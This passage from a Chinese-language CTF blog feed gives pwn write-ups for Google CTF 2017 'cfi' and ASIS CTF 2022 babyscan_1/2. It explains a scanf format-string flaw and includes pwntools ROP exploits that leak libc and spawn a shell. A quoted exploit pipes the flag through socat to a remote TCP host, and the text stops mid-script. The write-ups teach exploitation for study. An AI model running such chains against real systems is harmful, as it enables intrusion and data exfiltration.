r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># First we leak the address of the return address on the stack</span></span><br><span class="line"><span class="comment"># * fill the stack with a cyclic sequence</span></span><br><span class="line"><span class="comment"># * the CFI violation will tell us the right offset</span></span><br><span class="line">r = connect()</span><br><span class="line">send_data(STACK, cyclic(<span class="number">0xff0</span>))</span><br><span class="line">r.readuntil(<span class="string">&#x27;illegally targeted 0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(r.readline().strip(), <span class="number">16</span>)    <span class="comment">#//16进制读取返回的字符串(rbp上的字符串)</span></span><br><span class="line">RET_ADDR_AT = STACK + cyclic_find(leak) + <span class="number">8</span>*<span class="number">8</span>  <span class="comment">#//ret的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the args to execve</span></span><br><span class="line">rdi = BINSH</span><br><span class="line">rsi = RET_ADDR_AT + STACK_FRAME_SIZE + <span class="number">8</span></span><br><span class="line">rdx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># return into the child function of posix_spawn</span></span><br><span class="line">rop = p64(CLOSE_IN_CHILD)</span><br><span class="line"><span class="comment"># fill the stack frame with some data so that the function doesn&#x27;t crash</span></span><br><span class="line">rop += p64(RET_ADDR_AT+<span class="number">16</span>)</span><br><span class="line">rop += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># the child calls a function pointer with arguments from the stack</span></span><br><span class="line"><span class="comment"># we&#x27;re allowed to call execve here, since that&#x27;s what it normally does</span></span><br><span class="line">rop += p64(rdi) + p64(EXECVE) + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + p64(rsi) + p64(rdx)</span><br><span class="line"><span class="comment"># fill the rest of the stack frame with zeroes</span></span><br><span class="line">rop = rop.ljust(STACK_FRAME_SIZE+<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the address that we chose for rsi (our argv)</span></span><br><span class="line">rop += p64(BINSH)</span><br><span class="line">rop += p64(DASH_C)</span><br><span class="line">rop += p64(RET_ADDR_AT + <span class="built_in">len</span>(rop) + <span class="number">16</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += <span class="string">&quot;cat /flag.txt\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send the rop chain and read the flag</span></span><br><span class="line">r = connect()</span><br><span class="line">send_data(RET_ADDR_AT, rop)</span><br><span class="line">r.clean_and_log()</span><br></pre></td></tr></table></figure><br/><h4 id="对网上别人的exp的分析"><a href="#对网上别人的exp的分析" class="headerlink" title="对网上别人的exp的分析"></a>对网上别人的exp的分析</h4><p>源自：<a href="https://dangokyo.me/2017/11/10/google-ctf-2017-qualification-pwn-cfi-write-up/">https://dangokyo.me/2017/11/10/google-ctf-2017-qualification-pwn-cfi-write-up/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">DEBUG = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(DEBUG == <span class="number">0</span>):</span><br><span class="line">    r = remote(<span class="string">&quot;1.2.3.4&quot;</span>, <span class="number">2333</span>);</span><br><span class="line"><span class="keyword">elif</span>(DEBUG == <span class="number">1</span>):</span><br><span class="line">    r = process(<span class="string">&quot;./cfi&quot;</span>);</span><br><span class="line"><span class="keyword">elif</span>(DEBUG == <span class="number">2</span>):</span><br><span class="line">    r = process(<span class="string">&quot;./cfi&quot;</span>);</span><br><span class="line">    gdb.attach(r, <span class="string">&#x27;&#x27;&#x27;source ./script&#x27;&#x27;&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">halt</span>():</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        log.info(r.recvline());</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aa</span>(<span class="params">ra</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff544000</span> + ra;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># the base address of stack differs. In my test, I set a breakpoint at</span></span><br><span class="line"><span class="comment"># syscall_cp in read to get the base address in stack</span></span><br><span class="line"><span class="comment"># in real exploit I think I need to use cyclic string to overwrite the whole stack</span></span><br><span class="line"><span class="comment"># decide the base address of stack from feedback given by server.</span></span><br><span class="line">stackAddr = <span class="number">0xfffff1c8</span>;</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&quot;addr?&quot;</span>);</span><br><span class="line">r.sendline(<span class="built_in">hex</span>(stackAddr)[<span class="number">2</span>:]);</span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&quot;len?&quot;</span>);</span><br><span class="line">r.sendline(<span class="string">&quot;300&quot;</span>);</span><br><span class="line"> </span><br><span class="line">payload = p64(aa(<span class="number">0x882e8</span>));</span><br><span class="line">payload += p64(<span class="number">0xbabecafe</span>)*<span class="number">0x1</span> + p64(aa(<span class="number">0x57418</span>));</span><br><span class="line"> </span><br><span class="line">fakeR14 = stackAddr + <span class="number">0x8</span>;</span><br><span class="line">fakeRDI = stackAddr + <span class="number">0xc0</span>; <span class="comment">#0xfffff1c8; #stackAddr+;</span></span><br><span class="line">fakeRSI = stackAddr + <span class="number">0xc8</span>; <span class="comment">#stackAddr + 0xc8; #0xfffff1d0; #0x500;</span></span><br><span class="line">fakeRDX = <span class="number">0</span>; <span class="comment">#0xfffff2a8; #0x0;</span></span><br><span class="line">payload += p64(fakeR14) + p64(<span class="number">0</span>) * <span class="number">14</span> + p64(fakeRDI) + p64(<span class="number">0xff59acc0</span>);</span><br><span class="line"> </span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(fakeRSI) + p64(fakeRDX) + <span class="string">&quot;/bin/sh&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">1</span></span><br><span class="line">+ p64(fakeRDI) + p64(stackAddr+<span class="number">0x100</span>) + p64(stackAddr+<span class="number">0x103</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> +</span><br><span class="line"><span class="string">&quot;-c\x00cat flag | socat - TCP4:10.0.2.15:31337\x00&quot;</span>; </span><br><span class="line"> </span><br><span class="line">r.recvuntil(<span class="string">&quot;data?&quot;</span>);</span><br><span class="line">r.send(payload);</span><br></pre></td></tr></table></figure><br/><h4 id="暂时打住———————————————————————–"><a href="#暂时打住———————————————————————–" class="headerlink" title="暂时打住———————————————————————–"></a>暂时打住———————————————————————–</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不知道为什么，我的ubuntu20.04、ubuntu18.04、ubuntu16.04都无法跑题目给的二进制，暂时无法解决这一问题，这题暂时打住。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2017年的题，当时ubuntu16.04好像还没发布，所以可能需要更古老的ubuntu才能跑这道题。</p><h3 id="wiki"><a href="#wiki" class="headerlink" title=" wiki "></a><center><font color="orange"> wiki </font></center></h3>]]></content>
    
    
    <summary type="html">ctf题--2017</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>step1</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/10/21/step1/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/10/21/step1/</id>
    <published>2022-10-21T09:28:06.000Z</published>
    <updated>2022-10-21T12:22:06.098Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br></pre></td></tr></table></figure><h2 id="ASIS-CTF-2022-pwn"><a href="#ASIS-CTF-2022-pwn" class="headerlink" title="ASIS CTF 2022 pwn"></a>ASIS CTF 2022 pwn</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考链接(题目附件看这)：<a href="https://blingblingxuanxuan.github.io/2022/10/17/asis-ctf-2022-pwn/">ASIS CTF 2022 pwn babyscan_1 babyscan_2 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p><h3 id="babyscan-1"><a href="#babyscan-1" class="headerlink" title="babyscan_1"></a>babyscan_1</h3><h4 id="源C代码"><a href="#源C代码" class="headerlink" title="源C代码"></a>源C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;<span class="comment">//判断是否为数字,遇到非数字字符自动截止</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span>*)alloca(atoi(size) + <span class="number">1</span>);<span class="comment">//栈上申请一块内存空间</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);  <span class="comment">//将输入的[size]变为 %[size]s 存入fmt</span></span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);  <span class="comment">//搭配上句得到的效果为：scanf(&quot;%[size]s&quot;,buf);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、假设我们对size输入1$、12$…….等这种以$结尾的字符串，isdigit()时只会判定前面的1、12……这些数字，这样我们就能做到既不在isdigit()判定时退出程序，又能将 $ 输入进 size 中</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、当 $ 输入进 size 后，通过snprintf()与scanf()的搭配，我们能构造出scanf(“%1$s”,buf)、scanf(“%12$s”,buf)等这样的输入函数，而%1$n、%12$s这样的格式化字符串我们在格式化字符串漏洞中经常利用，所以我们依照格式化字符串漏洞的那套解题思路进行后续步骤。</p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、scanf(“%12$s”,buf)的意思是向栈上scanf的第12个参数位置上存储的地址处输入任意长度字符串</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4、64位函数参数存储顺序如下图，只要是存储着栈地址的参数我们都能用(第3条说明了向参数存储的地址处写入任意长度字符串)，从图中我们可以看到有RDI、RSI、RDX、参数12、参数13，对应%0$s、%1$s、%2$s、%11$s、%12$s，其中参数12存储的是高于当前函数栈帧rbp的栈地址，不好找更高地址的rbp在哪个位置，所以不考虑使用%11$s，本题我们利用%1$s。</p><p><img src="1.png" alt="image-20221021181532541"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5、之后便是一系列模板操作：查找偏移值、覆写ret控制执行流、重执main()函数或start()函数、泄露libc地址、调用system(“/bin/sh”)</p><h5 id="查找偏移值"><a href="#查找偏移值" class="headerlink" title="查找偏移值"></a>查找偏移值</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用以下脚本可得知偏移值为72</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(myio,<span class="string">&quot;b *0x401364 \n c&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure><h5 id="覆写ret泄露libc地址并重新执新main函数"><a href="#覆写ret泄露libc地址并重新执新main函数" class="headerlink" title="覆写ret泄露libc地址并重新执新main函数"></a>覆写ret泄露libc地址并重新执新main函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401433</span></span><br><span class="line">got_snprintf = <span class="number">0x404030</span></span><br><span class="line">plt_puts = <span class="number">0x4010B4</span></span><br><span class="line">main_addr = <span class="number">0x401216</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401364 \n c&quot;)</span></span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line">snprintf_addr = u64(myio.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = snprintf_addr - <span class="number">0x61d60</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure><h5 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;../lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;../lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401433</span></span><br><span class="line">got_snprintf = <span class="number">0x404030</span></span><br><span class="line">plt_puts = <span class="number">0x4010B4</span></span><br><span class="line">main_addr = <span class="number">0x401216</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(myio,&quot;b *0x401364 \n c&quot;)</span></span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line">snprintf_addr = u64(myio.recvline()[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = snprintf_addr - <span class="number">0x61d60</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x52290</span></span><br><span class="line">bin_sh_addr = libc_base + <span class="number">0x1B45BD</span></span><br><span class="line"></span><br><span class="line">exec_bin_sh = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">myio.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="string">b&quot;1$&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) </span><br><span class="line">myio.sendlineafter(<span class="string">&quot;data: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">myio.interactive()</span><br></pre></td></tr></table></figure><br/><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、学到了python脚本中更换二进制文件的 ld 与 libc 操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myelf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;../lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;../lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = process(argv=[myld.path,myelf.path],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : mylibc.path&#125;)</span><br></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、巩固了pwn题基础知识，见识了初看完全看不懂的C语言代码</p><br/><br/><h3 id="babyscan-2"><a href="#babyscan-2" class="headerlink" title="babyscan_2"></a>babyscan_2</h3><h4 id="源C代码-1"><a href="#源C代码-1" class="headerlink" title="源C代码"></a>源C代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> size[<span class="number">16</span>], fmt[<span class="number">8</span>], *buf;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, size);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(*size)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid number&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(atoi(size) + <span class="number">1</span>);    <span class="comment">//堆上申请一块空间</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(fmt, <span class="keyword">sizeof</span>(fmt), <span class="string">&quot;%%%ss&quot;</span>, size);</span><br><span class="line">  <span class="built_in">scanf</span>(fmt, buf);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);    <span class="comment">//从 return 0; 变成了 exit(0); 估计有用不然没必要改</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、出现 malloc ，但没出现 free() 函数，无法利用堆相关的解题方法</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2、注意到 scanf(“%15s”, size); ，可以输入一个数字，同时在输入一个数字后可以输入一些字符串，只要总体长度不超过15就行，而size存储在栈上，也就是说我们可以向栈上输入一些我们想要输入的字符，因此或许我们可以利用与上题类似的思路解这道题</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3、gdb调试，向程序输入1$xxxxyyyyzzzz，可以看到在第10个参数位置存储着我们输入的字符串 yyzzzz，</p><p><img src="2.png" alt="image-20221021191405157"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>4、既然这样，我们可以将 yyzzzz 替换为任意地址 aaaaaa，然后在输入size时输入 9$xxaaaaaa，就可以向地址 aaaaaa 处写任意长度的字符串</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5、接下来是套模板：查找偏移值、覆写ret控制执行流、重执main()函数或start()函数、泄露libc地址、调用system(“/bin/sh”)，不过这题buf不在栈上，我们想要覆写ret来控制执行流的话有点困难，同时调用system(“/bin/sh”)也很困难，那我们就只能考虑libc中现有的 execve() 来获取shell。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，程序中不存在后门函数，我们就必须要泄露libc地址，利用libc中的 execve(“/bin/sh”,参数2,参数2); </p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其次，想要做到泄露libc地址的同时又调用execve()，那就必须有重新执行main()函数或start()函数这一步骤</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再者，若想重新执行main()或start()，同时无法利用ret，那我们得分析我们现在有的能力</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时，我们有的是向任意地址写入任意长度的字符串的能力</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么，我们可以将exit()函数的got表值改为main()或start()的got表值，这样每次执行exit()时其实是在执行main()或start()</p><p>ok，分析完毕，就从修改exit()的got表重新执行main()或start()开始</p><h5 id="重执main-函数或start-函数"><a href="#重执main-函数或start-函数" class="headerlink" title="重执main()函数或start()函数"></a>重执main()函数或start()函数</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[:-1]的效果是只取p64里面的前7个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./bin/chall&quot;</span>)</span><br><span class="line">mylibc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line">myld = ELF(<span class="string">&quot;./lib/ld-2.31.so&quot;</span>)</span><br><span class="line">myio = 